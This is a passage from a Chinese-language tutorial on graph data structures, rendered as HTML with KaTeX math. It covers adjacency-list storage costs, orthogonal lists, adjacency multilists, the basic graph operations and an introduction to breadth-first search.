<li>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为无向图，则所需的存储空间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mn>2</mn><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V| + 2|E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>；若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为有向图，则所需的存储空间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V| + |E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>。前者的倍数 <code>2</code> 是由于无向图中，每条边在邻接表中出现了两次</li>
<li>对于稀疏图，采用邻接表表示将极大地节省存储空间</li>
<li>在邻接表中，给定一顶点，能很容易地找出它的所有邻边，因为只需要读取它的邻接表。在邻接矩阵中，相同的操作则需要扫描一行，花费的时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。但是，若要确定给定的两个顶点间是否存在边，则在邻接矩阵中可以立刻查到，而在邻接表中则需要在相应结点对应的边表中查找另一结点，效率较低</li>
<li>在有向图的邻接表表示中，求一个给定顶点的出度只需计算其邻接表中的结点个数；但求其顶点的入度则需要遍历全部的邻接表。因此，也有人采用逆邻接表的存储方式来加速求解给定顶点的入度。当然，这实际上与邻接表存储方式是类似的</li>
<li>图的邻接表表示并不唯一，因为在每个顶点对应的单链表中，各边结点的链接次序可以是任意的，它取决于建立邻接表的算法及边的输入次序</li>
</ul>
<h4> 十字链表</h4>
<p>十字链表是有向图的一种链式存储结构。在十字链表中，对应于有向图中的每条弧有一个结点，对应于每个顶点也有一个结点。</p>
<p>弧结点的结构：</p>
<table>
<thead>
<tr>
<th style="text-align:center">tailvex</th>
<th style="text-align:center">headvex</th>
<th style="text-align:center">hlink</th>
<th style="text-align:center">tlink</th>
<th style="text-align:center">(info)</th>
</tr>
</thead>
</table>
<p>弧结点中有 <code>5</code> 个域：<code>tailvex</code> 和 <code>headvex</code> 两个域分别指示弧尾和弧头这两个顶点的编号；<code>hlink</code> 域指向弧头相同的下一个弧结点；<code>tlink</code> 域指向弧尾相同的下一个弧结点；<code>info</code> 域存放该弧的相关信息。这样，弧头相同的弧就在同一个链表上，弧尾相同的弧也在同一个链表上。</p>
<p>顶点结点的结构：</p>
<table>
<thead>
<tr>
<th style="text-align:center">data</th>
<th style="text-align:center">firstin</th>
<th style="text-align:center">firstout</th>
</tr>
</thead>
</table>
<p>顶点结点中有 <code>3</code> 个域：<code>data</code> 域存放该顶点的数据信息，如：顶点名称；<code>firstin</code> 域指向以该顶点为弧头的第一个弧结点；<code>firstout</code> 域指向以该顶点为弧尾的第一个弧结点。</p>
<p>在十字链表中，既容易找到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为尾的弧，也容易找到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为头的弧，因而容易求得顶点的出度和入度。图的十字链表表示是不唯一的，但一个十字链表表示确定一个图。注意，顶点结点之间是顺序存储的。</p>
<h4> 邻接多重表</h4>
<p>邻接多重表是无向图的另一种链式存储结构。 在邻接表中，容易求得顶点和边的各种信息，但在邻接表中求两个顶点之间是否存在边而对边执行删除等操作时，需要分别在两个顶点的边表中遍历，效率较低。 与十字链表类似，在邻接多重表中，每条边用一个结点表示，其结构如下所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">ivex</th>
<th style="text-align:center">ilink</th>
<th style="text-align:center">jvex</th>
<th style="text-align:center">jlink</th>
<th style="text-align:center">(info)</th>
</tr>
</thead>
</table>
<p>其中，<code>ivex</code> 和 <code>jvex</code> 这两个域指示该边依附的两个顶点的编号；<code>ilink</code> 域指向下一条依附于顶点 <code>ivex</code> 的边；<code>jlink</code> 域指向下一条依附于顶点 <code>jvex</code> 的边，<code>info</code> 域存放该边的相关信息。</p>
<p>每个顶点也用一个结点表示，它由如下所示的两个域组成：</p>
<table>
<thead>
<tr>
<th style="text-align:center">data</th>
<th style="text-align:center">firstedge</th>
</tr>
</thead>
</table>
<p>其中，<code>data</code> 域存放该顶点的相关信息，<code>firstedge</code> 域指向第一条依附于该顶点的边。</p>
<p>在邻接多重表中，所有依附于同一顶点的边串联在同一链表中，由于每条边依附于两个顶点，因此每个边结点同时链接在两个链表中。对无向图而言，其邻接多重表和邻接表的差别仅在于，同一条边在邻接表中用两个结点表示，而在邻接多重表中只有一个结点。</p>
<h4> 图的基本操作</h4>
<p>图的基本操作是独立于图的存储结构的。而对于不同的存储方式，操作算法的具体实现会有着不同的性能。在设计具体算法的实现时，应考虑采用何种存储方式的算法效率会更高。</p>
<p>图的基本操作主要包括（仅抽象地考虑，故忽略掉各变量的类型）：</p>
<ul>
<li><strong>Adjacent(G, x, y)</strong>：判断图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 是否存在边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;x, y&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></li>
<li><strong>Neighbors(G, x)</strong>：列出图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中与结点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 邻接的边</li>
<li><strong>Insertvertex(G, x)</strong>：在图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中插入顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></li>
<li><strong>DeleteVertex(G, x)</strong>：从图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中删除顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></li>
<li><strong>AddEdge(G, x, y)</strong>：若无向边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 或有向边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;x, y&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 不存在，则向图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中添加该边</li>
<li><strong>RemoveEdge(G, x, y)</strong>：若无向边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 或有向边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;x, y&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 存在，则从图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中删除该边</li>
<li><strong>FirstNeighbor(G, x)</strong>：求图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的第一个邻接点，若有则返回顶点号。若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 没有邻接点或图中不存在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>，则返回 <code>-1</code></li>
<li><strong>NextNeighbor(G, x, y)</strong>：假设图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 是顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的一个邻接点，返回除 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 外顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的下一个邻接点的顶点号，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的最后一个邻接点，则返回 <code>-1</code></li>
<li><strong>Get_edge_value(G, x, y)</strong>：获取图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;x, y&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 对应的权值</li>
<li><strong>Set_edge_value(G, x, y, v)</strong>：设置图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;x, y&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 对应的权值为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></li>
</ul>
<p>此外，保有图做遍历算法：按照某种方式访问图中的每个顶点且仅访问一次。图的遍历算法包括深度优先遍历和广度优先遍历。</p>
<h3> 图的遍历</h3>
<p>图的遍历是指从图中的某一顶点出发，按照某种搜索方法沿着图中的边对图中的所有顶点访问一次且仅访问一次。注意到树是一种特殊的图，所以树的遍历实际上也可视为一种特殊的图的遍历。图的遍历算法是求解图的连通性问题、拓扑排序和求关键路径等算法的基础。</p>
<p>图的遍历比树的遍历要复杂得多，因为图的任意一个顶点都可能和其余的顶点相邻接，所以在访问某个顶点后，可能沿着某条路径搜索又回到该顶点上。为避免同一顶点被访问多次，在遍历图的过程中，必须记下每个已访问过的顶点，为此可以设一个辅助数组 <code>visited[]</code> 来标记顶点是否被访问过。图的遍历算法主要有两种：广度优先搜索和深度优先搜索。</p>
<h4> 广度优先搜索</h4>
<p>广度优先搜索（Breadth-First-Search, BFS）类似于二叉树的层序遍历算法。<strong>基本思想是</strong>：首先访问起始顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，接着由 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 出发，依次访问 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的各个未访问过的邻接顶点然后依次访问 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_{1}, w_{2}, \dotsc, w_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的所有未被访问过的邻接顶点；再从这些访问过的顶点出发，访问它们所有未被访问过的邻接顶点，直至图中所有顶点都被访问过为止。若此时图中尚有顶点未被访问，则另选图中一个未曾被访问的顶点作为始点，重复上述过程，直至图中所有顶点都被访问到为止。<code>Dijkstra</code> 单源最短路径算法和 <code>Prim</code> 最小生成树算法也应用了类似的思想。</p>
